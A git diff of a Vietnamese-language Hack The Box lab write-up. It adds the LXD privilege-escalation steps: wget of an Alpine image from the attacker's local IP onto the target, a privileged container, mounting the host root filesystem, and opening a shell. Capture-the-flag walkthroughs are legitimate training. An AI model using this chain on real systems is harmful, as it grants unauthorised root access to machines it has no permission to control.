@@ -55,9 +55,16 @@ ip: 10.129.95.185
 
 - tạo 1 sever http 
 ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/521a513e-3a5d-43dc-b254-8b12ea1052a4)
-- 
+- wget http://10.10.14.66:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz : để tải file lên mục tiêu: 10.10.14.66 ip local
 ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/791d50a7-ec85-4af3-afe7-c580477b4958)
+- image container vào LXD đặt tên là myimage
+![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/75534106-2098-4fed-a773-4784dee7fb76)
+- lxc init myimage privesc -c security.privileged=true
+- lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+- lxc exec privesc /bin/sh
+![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/ff916f17-697e-4786-8dd9-ac6a42679efd)
 
+![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/fbd3e6a2-9ed4-4c9c-8327-98575c83e54f)
 
 
 
